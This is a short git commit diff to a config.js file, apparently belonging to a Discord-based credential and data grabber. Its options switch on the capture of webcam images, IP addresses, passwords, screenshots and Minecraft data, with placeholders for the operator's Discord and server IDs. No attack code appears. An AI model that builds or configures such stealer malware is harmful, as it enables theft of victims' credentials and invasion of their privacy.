b9129c2b21d6d0ddf79c694254a9b82d9dc98d54
Exponent <103051123+Rdmo1@users.noreply.github.com>
2022-09-04 10:58:11 +0800

    Update config.js

--- config.js
+++ config.js
@@ -3,10 +3,10 @@
     "discord_id": "ENTER YOUR DISCORD ID",
     "server_id": "ENTER YOUR SERVER ID",
     
- 
+ # modify this if you want
     "grab_webcam": true, 
     "grab_ip": true,
-    "grab_history": "false",
+    "grab_screenshot": "false",
 
     "grab_password": "true",
     "grab_minecraft": "false",
